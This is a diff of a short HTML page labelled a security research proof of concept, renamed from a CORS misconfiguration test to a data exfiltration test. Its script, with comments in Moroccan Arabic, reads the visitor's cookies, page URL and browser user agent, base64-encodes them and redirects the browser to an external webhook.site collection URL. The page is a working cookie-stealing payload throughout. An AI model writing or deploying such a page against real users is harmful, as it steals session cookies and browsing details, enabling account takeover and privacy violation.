@@ -1,11 +1,19 @@
 <!DOCTYPE html>
 <html>
 <body>
-    <h1>Security Research PoC - CORS Misconfiguration</h1>
+    <h1>Security Research PoC - Data Exfiltration Test</h1>
     <script>
         var exfil_url = "https://webhook.site/2cbc72eb-5f42-44f9-998b-7a8dd2611ef0";
-        var cookies = btoa(unescape(encodeURIComponent(document.cookie)));
-        window.location.href = exfil_url + "?id=" + cookies;
+        
+        // غانجمعو معلومات مخلطة: الكوكيز اللي مسموح بيهم + رابط الصفحة + التوقيت
+        var leaked_info = "URL: " + window.location.href + 
+                          " | Cookies: " + document.cookie + 
+                          " | UserAgent: " + navigator.userAgent;
+
+        var encoded_data = btoa(unescape(encodeURIComponent(leaked_info)));
+        
+        // صيفط الداتا
+        window.location.href = exfil_url + "?id=" + encoded_data;
     </script>
 </body>
 </html>
